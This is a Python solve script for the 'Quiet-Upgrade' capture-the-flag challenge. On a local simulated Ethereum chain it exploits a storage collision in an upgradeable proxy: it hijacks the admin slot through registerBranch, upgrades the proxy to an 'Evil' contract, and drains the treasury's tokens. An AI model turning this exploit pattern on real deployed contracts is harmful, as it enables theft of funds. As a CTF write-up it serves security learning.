# Quiet-Upgrade — hiCTF (script de solve)
import solcx, json
from web3 import Web3
from eth_tester import EthereumTester, PyEVMBackend
from web3.providers.eth_tester import EthereumTesterProvider
solcx.set_solc_version("0.8.24")
CDIR="quiet/contracts"
SRC={}
import os
for f in os.listdir(CDIR):
    SRC[f]=open(os.path.join(CDIR,f)).read()

# Evil implementation: hijack-free drain logic + proxiableSlot bound to caller (proxy)
EVIL='''
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
interface ITreasury { function reserveBalance() external view returns (uint256); function release(address,uint256) external; }
contract Evil {
    // storage slots here land in PROXY storage via delegatecall (irrelevant for drain)
    address _a; address _b; // keep slots 0/1 harmless
    function proxiableSlot() external view returns (bytes32) {
        // called via STATICCALL from the proxy: msg.sender == proxy address
        return keccak256(abi.encodePacked(keccak256("quiet-upgrade.proxiable"), msg.sender));
    }
    function drain(address treasury, address to) external {
        uint256 bal = ITreasury(treasury).reserveBalance();
        ITreasury(treasury).release(to, bal);
    }
}
'''
SRC["Evil.sol"]=EVIL
out=solcx.compile_source(
    "\n".join(f"// FILE {k}\n{v}" for k,v in SRC.items()) if False else None,
) if False else None

# Compile with standard JSON to handle imports
sources={k:{"content":v} for k,v in SRC.items()}
inp={"language":"Solidity","sources":sources,
 "settings":{"optimizer":{"enabled":True,"runs":200},
  "outputSelection":{"*":{"*":["abi","evm.bytecode.object"]}}}}
comp=solcx.compile_standard(inp, allow_paths=".")
def get(cfile,cname):
    c=comp["contracts"][cfile][cname]
    return c["abi"], c["evm"]["bytecode"]["object"]

t=EthereumTester(backend=PyEVMBackend())
w3=Web3(EthereumTesterProvider(t))
acct=w3.eth.accounts
deployer=acct[0]; player=acct[1]
w3.eth.default_account=deployer

def deploy(cfile,cname,*args,sender=deployer,value=0):
    abi,bc=get(cfile,cname)
    C=w3.eth.contract(abi=abi,bytecode=bc)
    tx=C.constructor(*args).transact({"from":sender,"value":value})
    rc=w3.eth.wait_for_transaction_receipt(tx)
    return w3.eth.contract(address=rc.contractAddress,abi=abi), rc.contractAddress

# Deploy Setup(player) -> it builds the whole system
setup, setup_addr = deploy("Setup.sol","Setup", player)
stl_addr=setup.functions.stl().call()
treasury_addr=setup.functions.treasury().call()
proxy_addr=setup.functions.proxy().call()
v1_addr=setup.functions.settlementV1().call()
ops_addr=setup.functions.ops().call()
print("proxy",proxy_addr,"treasury",treasury_addr)
print("isSolved (start):", setup.functions.isSolved().call())
TREAS_START=w3.eth.contract(address=stl_addr,abi=get("ERC20Base.sol","ERC20Base")[0]).functions.balanceOf(treasury_addr).call()
print("treasury STL start:", TREAS_START//10**18)

# ABIs for proxy-as-V1 and proxy admin funcs
v1_abi=get("SettlementV1.sol","SettlementV1")[0]
proxy_abi=get("SettlementProxy.sol","SettlementProxy")[0]
# merge: call V1 funcs AT proxy address, and proxy funcs AT proxy address
proxy_as_v1=w3.eth.contract(address=proxy_addr,abi=v1_abi)
proxy_as_proxy=w3.eth.contract(address=proxy_addr,abi=proxy_abi)

# check admin before
print("proxy.admin before:", proxy_as_proxy.functions.admin().call(), "(ops=%s)"%ops_addr)

# ---- EXPLOIT (as player EOA) ----
# 1) registerBranch(player) via proxy -> writes slot0 (branchOperator == proxy.admin)
tx=proxy_as_v1.functions.registerBranch(player).transact({"from":player})
w3.eth.wait_for_transaction_receipt(tx)
print("proxy.admin after registerBranch:", proxy_as_proxy.functions.admin().call(), "(player=%s)"%player)

# 2) deploy Evil, upgradeTo(Evil) as new admin (player)
evil, evil_addr = deploy("Evil.sol","Evil", sender=player)
tx=proxy_as_proxy.functions.upgradeTo(evil_addr).transact({"from":player})
w3.eth.wait_for_transaction_receipt(tx)
print("proxy.implementation after upgrade:", proxy_as_proxy.functions.implementation().call(), "(evil=%s)"%evil_addr)

# 3) drain via proxy delegatecall -> Evil.drain(treasury, player)
proxy_as_evil=w3.eth.contract(address=proxy_addr,abi=evil.abi)
tx=proxy_as_evil.functions.drain(treasury_addr, player).transact({"from":player})
w3.eth.wait_for_transaction_receipt(tx)

bal=w3.eth.contract(address=stl_addr,abi=get("ERC20Base.sol","ERC20Base")[0]).functions.balanceOf(treasury_addr).call()
print("treasury STL after drain:", bal//10**18)
print("player STL after:", w3.eth.contract(address=stl_addr,abi=get("ERC20Base.sol","ERC20Base")[0]).functions.balanceOf(player).call()//10**18)
print(">>> isSolved():", setup.functions.isSolved().call())
